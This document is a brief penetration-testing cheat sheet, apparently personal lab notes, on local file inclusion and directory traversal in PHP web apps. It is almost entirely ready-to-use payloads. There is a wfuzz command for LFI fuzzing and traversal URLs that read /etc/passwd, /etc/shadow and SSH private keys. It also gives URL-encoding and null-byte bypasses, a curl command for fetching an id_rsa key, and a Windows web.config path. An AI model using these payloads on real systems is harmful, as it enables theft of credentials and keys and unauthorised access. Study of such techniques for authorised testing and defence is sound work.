
### LFI with wfuzz

```
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hc 404 --hh 206 http://192.168.0.119/index.php?file=FUZZ
//need to verify
```

### Dir Traversal

```
Basic Traversal
	http://url/index.php?page=../../../etc/passwd
	http://url/index.php?page=../../../etc/shadow
	http://url/index.php?page=../../../etc/knockd.conf
	http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub 
	http://url/index.php?page=../../../home/user/.ssh/id_rsa    //chmod 2 use
	http://url/index.php?page=../../../home/user/.ssh/authorized_keys

Encoding defeat
	http://url/index.php?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd
	http://url/index.php?page=%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd

Curl (formats keys better)
	curl -i http://url/index.php?page=../../../../../../../home/offsec/.ssh/id_rsa

Windows Dir Checks
	C:\inetpub\wwwroot\web.config
	
```

### Null Byte
```
http://url/index.php?page=../../../etc/passwd%00
```